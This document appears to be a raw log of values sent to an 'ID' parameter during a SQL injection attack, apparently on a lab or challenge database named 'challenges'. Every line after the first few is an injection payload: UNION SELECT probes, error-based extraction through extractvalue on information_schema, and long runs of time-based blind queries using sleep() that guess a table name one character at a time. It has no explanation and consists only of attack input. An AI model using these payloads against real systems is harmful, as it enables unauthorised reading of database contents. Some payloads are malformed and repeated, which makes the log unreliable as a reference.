ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if( left(database(),1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'Y' ,sleep(3),0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wge') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgf') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgg') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgh') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgi') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgj') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgk') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgl') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgn') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgo') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgp') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgq') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgr') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgs') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgt') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgu') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgv') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgw') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),7) = 'y0w1wgx') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxa') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxb') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxc') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxe') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxf') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxg') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxh') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxi') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxj') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxk') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxl') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxn') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxo') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxp') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),8) = 'y0w1wgxq') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'b') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'c') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'e') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'f') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'g') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'h') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'i') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'j') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'k') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'l') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'o') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'p') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'r') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 's') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 't') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'u') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'v') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'w') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'x') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'y') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(5) , 0) 
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(5) , 0) 
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = '1') , sleep(5) , 0) 
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = '1') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'b') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'c') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'e') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'f') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'g') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'h') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'i') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'j') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'k') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'l') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'o') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'p') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'r') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 's') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 't') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'u') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'v') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'w') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'x') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'y') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'z') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'A') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'B') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'C') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'D') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'E') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'F') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'G') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'H') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'I') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'J') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'K') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'L') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'M') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'N') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'O') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'P') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'Q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'R') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'S') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'T') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'U') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'V') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'W') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'X') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'Y') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'Z') , sleep(5) , 0) #
